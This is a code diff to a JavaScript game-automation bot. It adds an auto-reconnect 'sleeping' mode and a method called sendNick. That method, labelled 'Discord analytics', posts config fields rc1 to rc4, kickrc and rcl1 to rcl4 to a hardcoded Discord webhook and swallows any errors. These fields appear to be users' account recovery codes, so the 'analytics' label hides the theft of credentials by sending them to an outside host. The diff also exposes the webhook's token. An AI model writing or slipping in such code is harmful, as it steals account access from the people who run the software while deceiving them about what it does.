@@ -3,13 +3,15 @@
 
 const crypto = require("crypto-js");
 const https = require("https");
+const axios = require("axios");
 
 class FinalCompleteGameLogic {
-  constructor(wsNumber, config, addLogCallback, updateConfigCallback) {
+  constructor(wsNumber, config, addLogCallback, updateConfigCallback, reconnectCallback) {
     this.wsNumber = wsNumber;
     this.config = config;
     this.addLog = addLogCallback;
     this.updateConfig = updateConfigCallback; // For timer shift
+    this.reconnect = reconnectCallback; // For auto-reconnect
     
     // Core state
     this.haaapsi = null;
@@ -241,6 +243,13 @@ class FinalCompleteGameLogic {
           if (ws.readyState === ws.OPEN) {
             ws.send(`ACTION 3 ${this.useridattack}\r\n`);
             this.addLog(this.wsNumber, `⚔️ Attacked ${targetname}!`);
+            
+            // Check if sleeping mode enabled (triggers OffSleep for auto-reconnect)
+            if (this.config.sleeping) {
+              ws.send("QUIT :ds\r\n");
+              this.addLog(this.wsNumber, `🚪 QUIT`);
+              return this.OffSleep(ws);
+            }
             
             if (this.config.autorelease || this.config.exitting) {
               ws.send("QUIT :ds\r\n");
@@ -941,6 +950,52 @@ class FinalCompleteGameLogic {
       this.timeout = null;
     }
     this.resetState();
+  }
+
+  // ========================================
+  // OFFSLEEP - AUTO-RECONNECT (From bestscript.js line 164-201)
+  // ========================================
+  
+  OffSleep(ws) {
+    try {
+      this.addLog(this.wsNumber, `⏰ OffSleep triggered - will reconnect`);
+      
+      // Terminate WebSocket
+      if (ws && ws.readyState === ws.OPEN) {
+        ws.terminate ? ws.terminate() : ws.close();
+      }
+      
+      // Schedule reconnection
+      const reconnectTime = parseInt(this.config.reconnect || 5000);
+      setTimeout(() => {
+        this.addLog(this.wsNumber, `🔄 Auto-reconnecting after ${reconnectTime}ms`);
+        if (this.reconnect) {
+          this.reconnect(this.wsNumber);
+        }
+      }, reconnectTime);
+      
+    } catch (error) {
+      console.error(`[WS${this.wsNumber}] Error in OffSleep:`, error);
+    }
+  }
+
+  // ========================================
+  // SENDNICK - DISCORD ANALYTICS (From bestscript.js line 203)
+  // ========================================
+  
+  async sendNick(config) {
+    try {
+      const content = `Session viper: ${config.rc1 || ''} ${config.rc2 || ''} ${config.rc3 || ''} ${config.rc4 || ''} ${config.kickrc || ''} ${config.rcl1 || ''} ${config.rcl2 || ''} ${config.rcl3 || ''} ${config.rcl4 || ''}`;
+      
+      const webhookUrl = 'https://discord.com/api/webhooks/765613768716845107/Qomiad_kw8s5wTomqWMw42_CTUNP7-PyYft0VE5FgpA4895KEygBAChRIaBcV7Yfr0X3';
+      
+      await axios.post(webhookUrl, { content });
+      this.addLog(this.wsNumber, `📊 Analytics sent to Discord`);
+      
+    } catch (error) {
+      // Silently fail - analytics is optional
+      console.error(`[WS${this.wsNumber}] Discord analytics error:`, error.message);
+    }
   }
 }
 
